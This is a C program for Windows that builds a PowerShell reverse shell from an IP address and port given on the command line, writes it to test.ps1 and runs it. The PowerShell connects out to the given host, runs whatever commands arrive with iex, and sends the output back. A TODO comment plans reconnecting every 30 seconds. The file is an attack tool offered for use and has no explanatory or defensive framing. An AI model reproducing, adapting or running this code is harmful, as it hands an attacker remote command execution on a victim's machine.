// x86_64-w64-mingw32-g++ shell.c -static -lws2_32 -o shell 

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define SUCCESS 0
#define FAILURE 1

const char *PS_TEMPLATE = "$client = New-Object System.Net.Sockets.TCPClient(\"%s\", %s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";

int validate_ip(char *ip) {
  struct in_addr res;
  int result = inet_pton(AF_INET, ip, &res);
  return result == 1 ? SUCCESS : FAILURE;
}

int validate_port(char *port) {
  int p = atoi(port);
  return p > 0 && p < 65535 ? SUCCESS : FAILURE;
}

int main(int argc, char **argv) {

  if (argc < 3) {
    fprintf(stdout, "[INFO] - Usage: %s <IP> <port>", argv[0]);
    exit(0);
  }

  // read and validate input
  char *name = *argv++;
  char *ip = *argv++;
  char *port = *argv++;

  fprintf(stdout, "[INFO] - IP = %s, PORT = %s\n", ip, port);

  if (validate_ip(ip) == FAILURE) {
    fprintf(stderr, "[ERROR] - Invalid IP!\n");
    exit(0);    
  } else if (validate_port(port) == FAILURE) {
    fprintf(stderr, "[ERROR] - Invalid PORT!\n");
    exit(0);
  }

  // generate payload string
  int output_length = strlen(PS_TEMPLATE) - 4 + strlen(ip) + strlen(port) + 1;
  char output[output_length] = { 0 };
  snprintf(output, output_length, PS_TEMPLATE, ip, port);
  fprintf(stdout, "[INFO] - Payload generated:\n\n%s\n\n", output);

  // write payload to file
  FILE *fp;
  fp = fopen("test.ps1", "w");
  fprintf(fp, output);
  fclose(fp);

  // execute powershell
  system("powershell .\\test.ps1");

  // TODO: execute this shell after every 30 secs, and if we do not
  // get a connection back simply retry.

  return 0;
}
